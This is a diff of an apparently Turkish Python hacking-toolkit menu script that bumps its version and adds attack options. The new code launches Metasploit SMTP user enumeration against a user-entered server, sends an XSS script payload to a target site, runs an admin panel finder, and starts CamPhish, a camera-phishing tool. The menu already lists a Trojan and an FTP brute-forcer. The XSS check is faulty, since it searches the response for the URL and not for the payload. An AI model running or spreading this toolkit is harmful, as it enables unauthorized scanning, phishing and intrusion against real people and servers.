@@ -40,15 +40,19 @@ ressamnotbody = """\033[94m\033[1m
                                                                        `--`  
        \033[93m Instagram: https://www.instagram.com/notbodyofficial/
 
-       \033[93m Git-Hub: https://github.com/not-body/  \033[94m\033[1m    V 1.3                                                                                                         
+       \033[93m Git-Hub: https://github.com/not-body/  \033[94m\033[1m    V 1.4                                                                                                         
                      
                                                   """
 anamenu = """\033[91m
 1 ) Şifrelemeler
 2 ) Trojan
-3 ) FTP Bruter (Metasploit)
-4 ) Domain Mail Scanner (Metasploit)
+3 ) FTP Bruter
+4 ) Domain Mail Scanner 
 5 ) IP Sorgu
+6 ) Admin Panel Finder
+7 ) SMTP Enum Exploit
+8 ) XSS Finder
+9 ) CamPhish
 """
 neyapakaq = """\033[91m
 1 ) Şifrele 
@@ -274,6 +278,33 @@ elif(body == "5"):
     print("\033[95mOrganizasyon: "+orgination)
     print("\033[95mLokasyon: "+location)
     exit()
+elif(body == "6"):
+    os.system("python2 tools/a.py")
+elif(body == "7"):
+    clear()
+    print(ressamnotbody)
+    a = input("Hedef Sunucu IP: ")
+    b = input("Hedef Sunucunun SMTP Portunu Giriniz [25 or 587]: ")
+    os.system("""msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum ; set RHOSTS {} ; set RPORT {} ; exploit ; exit" """.format(a,b))
+elif(body == "8"):
+    clear()
+    print(ressamnotbody)
+    a = "<script>alert(XSS)</script>"
+    b = input("\033[95mHedef Site: ")
+    c = requests.post(b + a)
+    if b in c.text:
+        print("\033[93m XSS BULUNDU")
+    else:
+        print("\033[93mXSS BULUNMADI")
+elif(body == "9"):
+    os.chdir("tools/")
+    os.system("bash camphish.sh")
+    os.chdir("../../")
+
+
+
+
+
 else:
     print("\033[91mYanlış Giden Bir Şeyler Var")
     exit()   
